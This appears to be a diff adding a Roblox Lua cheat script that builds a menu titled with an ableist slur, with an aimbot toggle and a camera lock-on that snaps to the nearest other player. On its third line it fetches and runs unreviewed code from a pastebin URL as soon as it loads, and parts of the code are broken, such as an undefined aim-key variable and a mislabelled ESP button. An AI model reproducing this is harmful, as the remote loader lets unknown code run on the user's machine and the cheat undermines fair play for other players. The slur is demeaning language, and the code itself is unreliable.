@@ -1,0 +1,310 @@
+-- Gui to Lua
+-- Version: 3.2
+loadstring(game:HttpGet('http://pastebin.com/raw/5j8qEvMV'))()
+-- Instances:
+
+local MarioJudah = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local TitleLabel = Instance.new("TextLabel")
+local AimbotEnableButton = Instance.new("TextButton")
+local AimkeyTextBox = Instance.new("TextBox")
+local AimkeyLabel = Instance.new("TextLabel")
+local BoxESPButton = Instance.new("TextButton")
+
+--Properties:
+
+MarioJudah.Name = "MarioJudah"
+MarioJudah.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+MarioJudah.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+Frame.Parent = MarioJudah
+Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Frame.BorderSizePixel = 0
+Frame.Position = UDim2.new(0.287282079, 0, 0.530562341, 0)
+Frame.Size = UDim2.new(0, 154, 0, 102)
+
+TitleLabel.Name = "TitleLabel"
+TitleLabel.Parent = Frame
+TitleLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TitleLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TitleLabel.BorderSizePixel = 0
+TitleLabel.Position = UDim2.new(0.0454549417, 0, 0, 0)
+TitleLabel.Size = UDim2.new(0, 146, 0, 26)
+TitleLabel.Font = Enum.Font.SourceSans
+TitleLabel.Text = "Fucking Retard Shit UI"
+TitleLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
+TitleLabel.TextSize = 14.000
+
+AimbotEnableButton.Name = "AimbotEnableButton"
+AimbotEnableButton.Parent = Frame
+AimbotEnableButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+AimbotEnableButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
+AimbotEnableButton.BorderSizePixel = 0
+AimbotEnableButton.Position = UDim2.new(0.196239516, 0, 0.223455086, 0)
+AimbotEnableButton.Size = UDim2.new(0, 93, 0, 16)
+AimbotEnableButton.Font = Enum.Font.SourceSans
+AimbotEnableButton.Text = "Aimbot Enable"
+AimbotEnableButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+AimbotEnableButton.TextSize = 14.000
+
+AimkeyTextBox.Name = "AimkeyTextBox"
+AimkeyTextBox.Parent = Frame
+AimkeyTextBox.BackgroundColor3 = Color3.fromRGB(191, 191, 191)
+AimkeyTextBox.BorderColor3 = Color3.fromRGB(0, 0, 0)
+AimkeyTextBox.BorderSizePixel = 0
+AimkeyTextBox.Position = UDim2.new(0.468292236, 0, 0.388346046, 0)
+AimkeyTextBox.Size = UDim2.new(0, 52, 0, 16)
+AimkeyTextBox.Font = Enum.Font.SourceSans
+AimkeyTextBox.Text = ""
+AimkeyTextBox.TextColor3 = Color3.fromRGB(0, 0, 0)
+AimkeyTextBox.TextSize = 14.000
+
+AimkeyLabel.Name = "AimkeyLabel"
+AimkeyLabel.Parent = Frame
+AimkeyLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+AimkeyLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
+AimkeyLabel.BorderSizePixel = 0
+AimkeyLabel.Position = UDim2.new(0.201798081, 0, 0.393388629, 0)
+AimkeyLabel.Size = UDim2.new(0, 42, 0, 15)
+AimkeyLabel.Font = Enum.Font.SourceSans
+AimkeyLabel.Text = "aim key"
+AimkeyLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
+AimkeyLabel.TextSize = 14.000
+
+BoxESPButton.Name = "BoxESPButton"
+BoxESPButton.Parent = Frame
+BoxESPButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+BoxESPButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
+BoxESPButton.BorderSizePixel = 0
+BoxESPButton.Position = UDim2.new(0.201386288, 0, 0.561790943, 0)
+BoxESPButton.Size = UDim2.new(0, 93, 0, 16)
+BoxESPButton.Font = Enum.Font.SourceSans
+BoxESPButton.Text = "Glow ESP"
+BoxESPButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+BoxESPButton.TextSize = 14.000
+
+-- Scripts:
+
+local function XDWBFWO_fake_script() -- AimbotEnableButton.LocalScript 
+	local script = Instance.new('LocalScript', AimbotEnableButton)
+
+	local button = script.Parent
+	local isToggled = false
+	
+	local function myFunction()
+		if isToggled then
+			print("AIMBOT toggle on")
+			
+		else
+			print("AIMBOT toggle off")
+			
+		end
+	end
+	
+	local function updateButtonAppearance()
+		if isToggled then
+			button.Text = "Aimbot Enable"
+			button.BackgroundColor3 = Color3.fromRGB(0, 170, 0)
+		else
+			button.Text = "Aimbot Enable"
+			button.BackgroundColor3 = Color3.fromRGB(170, 0, 0) 
+		end
+	end
+	
+	
+	button.MouseButton1Click:Connect(function()
+	
+		isToggled = not isToggled
+	
+	
+		myFunction()
+	
+	
+		updateButtonAppearance()
+	end)
+	
+	updateButtonAppearance()
+	
+	
+end
+coroutine.wrap(XDWBFWO_fake_script)()
+local function UEVY_fake_script() -- AimkeyTextBox.LocalScript 
+	local script = Instance.new('LocalScript', AimkeyTextBox)
+
+	local textBox = script.Parent
+	
+	local function handleInput(enterPressed)
+		local inputText = textBox.Text
+		print("Input changed in AimkeyTextBox:")
+		print("Text:", inputText)
+		if enterPressed then
+			print("Enter key was pressed.")
+			aimKey.Enum.KeyCode = Enum.KeyCode[string.upper(inputText)]
+			print("Updated KeyCode to:", inputText)
+		else
+			print("Focus was lost (clicked away).")
+			-- Add specific logic here for when focus is lost without pressing Enter
+		end
+	
+		-- You can add your desired function execution here based on inputText
+		-- Example:
+		-- if inputText == "activate" then
+		--     print("Activating something!")
+		-- elseif tonumber(inputText) then
+		--     print("Input is a number:", tonumber(inputText))
+		-- end
+	end
+	
+	-- Connect the function to the FocusLost event
+	textBox.FocusLost:Connect(handleInput)
+	
+	print("AimkeyTextBox input script loaded.")
+	
+end
+coroutine.wrap(UEVY_fake_script)()
+local function HIHYGH_fake_script() -- BoxESPButton.LocalScript 
+	local script = Instance.new('LocalScript', BoxESPButton)
+
+	local Players = game:GetService("Players")
+	local RunService = game:GetService("RunService")
+	
+	local button = script.Parent
+	local screenGui = button:FindFirstAncestorWhichIsA("ScreenGui")
+	local LocalPlayer = Players.LocalPlayer
+	local CurrentCamera = workspace.CurrentCamera
+	
+	local isToggled = false
+	local targetPlayer = nil
+	local renderStepConnection = nil
+	
+	-- Create FOV Circle UI
+	local fovCircle = Instance.new("Frame")
+	fovCircle.Name = "FOVCircle"
+	fovCircle.AnchorPoint = Vector2.new(0.5, 0.5)
+	fovCircle.Position = UDim2.fromScale(0.5, 0.5)
+	fovCircle.Size = UDim2.fromOffset(200, 200) -- Adjust size as needed
+	fovCircle.BackgroundTransparency = 1
+	fovCircle.BorderSizePixel = 2
+	fovCircle.BorderColor3 = Color3.fromRGB(255, 255, 255)
+	fovCircle.Visible = false
+	fovCircle.Parent = screenGui
+	
+	local uiCorner = Instance.new("UICorner")
+	uiCorner.CornerRadius = UDim.new(1, 0)
+	uiCorner.Parent = fovCircle
+	
+	-- Function to find the closest player
+	local function findClosestPlayer()
+		local closestPlayer = nil
+		local minDistance = math.huge
+		local localCharacter = LocalPlayer.Character
+		
+		if not localCharacter or not localCharacter:FindFirstChild("HumanoidRootPart") then
+			return nil
+		end
+		
+		local localRootPart = localCharacter.HumanoidRootPart
+	
+		for _, player in Players:GetPlayers() do
+			if player ~= LocalPlayer then
+				local character = player.Character
+				if character and character:FindFirstChild("HumanoidRootPart") then
+					local rootPart = character.HumanoidRootPart
+					local distance = (localRootPart.Position - rootPart.Position).Magnitude
+					
+					-- Optional: Check if player is within FOV circle radius (relative to screen center)
+					-- local screenPoint, onScreen = CurrentCamera:WorldToScreenPoint(rootPart.Position)
+					-- if onScreen then
+					--    local screenCenter = Vector2.new(CurrentCamera.ViewportSize.X / 2, CurrentCamera.ViewportSize.Y / 2)
+					--    local distFromCenter = (Vector2.new(screenPoint.X, screenPoint.Y) - screenCenter).Magnitude
+					--    if distFromCenter <= fovCircle.AbsoluteSize.X / 2 then
+					--       -- Player is within FOV circle on screen
+					--    end
+					-- end
+	
+					if distance < minDistance then
+						minDistance = distance
+						closestPlayer = character
+					end
+				end
+			end
+		end
+		return closestPlayer
+	end
+	
+	-- Function to update camera lock-on
+	local function updateLockOn()
+		if not isToggled then return end -- Only run if toggled on
+	
+		local localCharacter = LocalPlayer.Character
+		if not localCharacter then return end -- Need local character
+	
+		targetPlayer = findClosestPlayer()
+	
+		if targetPlayer and targetPlayer:FindFirstChild("HumanoidRootPart") then
+			local targetRootPart = targetPlayer.HumanoidRootPart
+			-- Ensure CameraType is Scriptable when actively locking on
+			if CurrentCamera.CameraType ~= Enum.CameraType.Scriptable then
+				CurrentCamera.CameraType = Enum.CameraType.Scriptable
+			end
+			CurrentCamera.CFrame = CFrame.lookAt(CurrentCamera.CFrame.Position, targetRootPart.Position)
+		else
+			-- No target found, optionally revert camera type if it was scriptable
+			-- Or just let it be reset when toggled off
+			-- if CurrentCamera.CameraType == Enum.CameraType.Scriptable then
+			--     CurrentCamera.CameraType = Enum.CameraType.Custom
+			-- end
+		end
+	end
+	
+	-- Function to update button appearance
+	local function updateButtonAppearance()
+		if isToggled then
+			button.Text = "Lock On (ON)"
+			button.BackgroundColor3 = Color3.fromRGB(0, 170, 0)
+		else
+			button.Text = "Lock On (OFF)"
+			button.BackgroundColor3 = Color3.fromRGB(170, 0, 0)
+		end
+	end
+	
+	-- Button click event
+	button.MouseButton1Click:Connect(function()
+		isToggled = not isToggled
+		updateButtonAppearance()
+	
+		if isToggled then
+			print("Lock-on Toggled ON")
+			fovCircle.Visible = true
+			-- Connect RenderStepped if not already connected
+			if not renderStepConnection then
+				CurrentCamera.CameraType = Enum.CameraType.Scriptable -- Set immediately for responsiveness
+				renderStepConnection = RunService.RenderStepped:Connect(updateLockOn)
+			end
+		else
+			print("Lock-on Toggled OFF")
+			fovCircle.Visible = false
+			targetPlayer = nil -- Clear target
+			-- Disconnect RenderStepped if connected
+			if renderStepConnection then
+				renderStepConnection:Disconnect()
+				renderStepConnection = nil
+			end
+			-- IMPORTANT: Reset camera type back to default
+			CurrentCamera.CameraType = Enum.CameraType.Custom
+			CurrentCamera.CameraSubject = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") or nil
+		end
+	end)
+	
+	-- Set initial appearance
+	updateButtonAppearance()
+	
+	-- Ensure camera is custom initially if script reloads while toggled on
+	if not isToggled then
+		CurrentCamera.CameraType = Enum.CameraType.Custom
+	end
+	
+	
+end
+coroutine.wrap(HIHYGH_fake_script)()
